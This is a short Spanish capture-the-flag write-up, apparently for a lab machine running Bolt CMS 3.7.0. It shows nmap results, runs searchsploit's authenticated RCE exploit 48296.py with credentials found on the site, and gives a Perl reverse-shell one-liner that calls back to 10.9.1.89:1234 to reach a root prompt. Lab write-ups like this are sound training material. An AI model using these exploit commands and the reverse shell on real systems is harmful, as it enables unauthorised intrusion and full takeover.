PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

-En el puerto 80 hay un apache server default sin importancia

-En el puerto 8000 tenemos un Bolt CMS

-Es una web en desarrollo y el admin debe ser idiota. El username y la password se puede encontrar por la web

-Investigando encontramos un exploit que nos permite un RCE aportando el username y la password
	Bolt CMS 3.7.0 - Authenticated Remote Code Execution

-Buscamos el exploit con searchsploit y lo ejecutamos:
	searchsploit bolt
	searchsploit -m php/webapps/48296.py 
	python 48296.py <url> <username> <password>
	python 48296.py http://10.10.181.50:8000 bolt boltadmin123

-Tenemos ejecución remota de comandos sobre la máquina (RCE). Nos mandamos una reverse shell. Las típicas no funcionan, deben de estar capadas. 

-Ejecutamos la reverse shell de  'Perl no sh' , de Reverse Shell Generator:
	perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.9.1.89:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

	root@bolt:~/public/files#

	-Hemos obtenido permisos de root directamente, ya que el comando lo hemos ejecutado bajo el usuario bolt, que es admin.